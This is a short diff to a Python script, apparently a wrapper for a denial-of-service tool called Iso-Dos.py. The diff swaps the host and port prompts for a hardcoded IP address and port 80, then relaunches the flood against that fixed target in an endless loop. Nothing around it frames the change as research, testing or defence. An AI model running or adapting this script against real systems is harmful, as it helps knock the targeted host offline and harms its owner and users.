@@ -10,8 +10,8 @@ print('''
  | | ___) |__) / ___ \| |  | |
 |___|____/____/_/   \_\_|  |_|
 ''')
-host=input('Enter host: ')
-port=input('Enter port: ')
+host='41.224.33.232'
+port=80
 while True:
 	os.system(f'python3 Iso-Dos.py -h {host} -p {port} -d auto')
 
